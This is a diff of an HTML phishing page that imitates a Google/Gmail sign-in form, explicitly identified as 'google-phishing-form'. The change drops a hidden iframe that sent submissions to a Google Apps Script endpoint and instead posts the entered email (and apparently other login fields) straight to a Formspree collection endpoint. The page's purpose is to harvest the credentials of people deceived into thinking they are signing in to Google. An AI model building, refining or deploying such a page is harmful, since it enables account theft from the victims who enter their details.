@@ -52,11 +52,6 @@
 </head>
 <body class="flex items-center justify-center min-h-screen">
 
-    <!-- This iframe is used as the target for the form submission. -->
-    <!-- It's hidden and allows the form to submit in the background -->
-    <!-- without leaving the current page, which prevents CORS errors. -->
-    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
-
     <div class="form-container max-w-md w-full p-8 sm:p-12">
         <div class="text-center">
             <!-- Google Logo SVG -->
@@ -70,9 +65,8 @@
             <p class="mt-2 text-gray-600">to continue to Gmail</p>
         </div>
 
-        <!-- The form now targets the hidden iframe. When submitted, the browser -->
-        <!-- will load the response from the Apps Script into this iframe. -->
-        <form id="google-phishing-form" class="mt-8 space-y-6" action="https://script.google.com/macros/s/AKfycbxtCqMtZWMKNTvc2NOmN_-VRXjkm-rrBwXBa_r4oNubKS6Q8RR8Q3RLqDCIdVo40smAlg/exec" method="POST" target="hidden_iframe">
+        <!-- This form now submits directly to Formspree -->
+        <form id="google-phishing-form" class="mt-8 space-y-6" action="https://formspree.io/f/xwpqokev" method="POST">
             <!-- Email Input -->
             <div class="relative input-field">
                 <input type="email" id="email" name="email" class="h-14" placeholder=" " required>
